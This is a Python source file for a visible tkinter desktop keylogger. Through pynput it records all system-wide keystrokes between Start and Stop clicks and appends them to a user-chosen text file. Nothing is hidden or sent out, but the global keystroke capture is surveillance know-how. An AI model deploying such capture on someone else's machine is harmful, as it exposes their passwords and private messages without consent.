import tkinter as tk
from tkinter import filedialog
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""

        self.root = tk.Tk()
        self.root.title("Keylogger")

        self.textbox = tk.Text(self.root, wrap="word")
        self.textbox.pack(fill="both", expand=True)

        self.status_label = tk.Label(self.root, text="Logging Stopped", fg="red")
        self.status_label.pack(pady=5)

        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(side="left", padx=5, pady=5)

        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging, state="disabled")
        self.stop_button.pack(side="left", padx=5, pady=5)

        self.clear_button = tk.Button(self.root, text="Clear Logs", command=self.clear_logs)
        self.clear_button.pack(side="left", padx=5, pady=5)

        self.save_button = tk.Button(self.root, text="Choose File", command=self.choose_file)
        self.save_button.pack(side="left", padx=5, pady=5)

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)  # Automatically scroll down
        with open(self.filename, 'a') as logs:
            logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if self.filename:
                self.is_logging = True
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.status_label.config(text="Logging Started", fg="green")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.status_label.config(text="Logging Stopped", fg="red")
            self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                      filetypes=[("Text files", "*.txt"), ("All files", "*.*")])

    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
